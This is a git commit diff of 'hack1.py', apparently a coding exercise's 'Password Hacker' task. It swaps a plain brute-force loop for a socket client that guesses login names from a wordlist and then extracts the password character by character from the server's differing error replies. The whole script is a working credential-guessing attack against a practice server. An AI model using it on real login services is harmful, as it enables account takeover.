4ba1d75bb3120bf301e8f19f651dafa18a921a28
Konstantin Lapitanov <89107827+Konstannttiinn1@users.noreply.github.com>
2022-08-01 19:57:18 +0300

    Update hack1.py

--- hack1.py
+++ hack1.py
@@ -1,41 +1,53 @@
+import sys
 import socket
-import argparse
-from itertools import product
-from string import ascii_lowercase, digits
+import itertools
+import json
+import string
 
 
-def main():
-    with socket.socket() as client_sock:
-        address = (args.ip_address, args.port)
-
-        client_sock.connect(address)
-
-        characters = "".join(ascii_lowercase + digits)
-
-        length = 1
-        while True:
-            password_set = product(characters, repeat=length)
-            send_receive(client_sock, password_set)
-            length += 1
+def get_name_variants():
+    name_vars = []
+    with open(r"C:\Users\Костян\PycharmProjects\Password Hacker\task\logins.txt", 'r', encoding='utf-8') as f:
+        names = f.read().strip('\n').splitlines()
+        # print(names)
+        for name in names:
+            _vars = map("".join, itertools.product(*zip(name.upper(), name.lower())))
+            for _var in _vars:
+                name_vars.append(_var)
+        # print(name_vars) correct variants
+        return name_vars
 
 
-def send_receive(client, password_set):
-    for password in password_set:
-        client.send("".join(password).encode())
-
-        response = client.recv(1024)
-
-        response = response.decode()
-
-        if response == "Connection success!":
-            print("".join(password))
-            exit(0)
-
-
-if __name__ == "__main__":
-    parser = argparse.ArgumentParser()
-    parser.add_argument('ip_address', type=str, help='IP address')
-    parser.add_argument('port', type=int, help='port number')
-    args = parser.parse_args()
-
-    main()
+args = sys.argv
+ip = args[1]
+port = int(args[2])
+address = (ip, port)
+with socket.socket() as client_socket:
+    client_socket.connect(address)
+    # get name
+    lis = get_name_variants()
+    login = ""
+    for i in lis:
+        only_name_json = json.dumps({"login": f"{i}", "password": ""})
+        client_socket.send(only_name_json.encode())
+        test_name_reply = json.loads(client_socket.recv(1024).decode())
+        if test_name_reply["result"] == 'Wrong password!' or test_name_reply["result"] == 'Exception happened during login':
+            # print(f"log in name is {i}")
+            login = i
+            break
+    # get pw
+    # print(login)
+    symbols = string.printable
+    password = ""
+    while True:
+        for x in symbols:
+            password = password + x
+            client_socket.send(json.dumps({"login": f"{login}", "password": f"{password}"}).encode())
+            test_pw_reply = json.loads(client_socket.recv(1024).decode())
+            if test_pw_reply["result"] == "Connection success!":
+                print(json.dumps({"login": f"{login}", "password": f"{password}"}))
+                sys.exit()
+            elif test_pw_reply["result"] == "Wrong password!":
+                password = password[:-1]
+            elif test_pw_reply["result"] == "Exception happened during login":
+                break
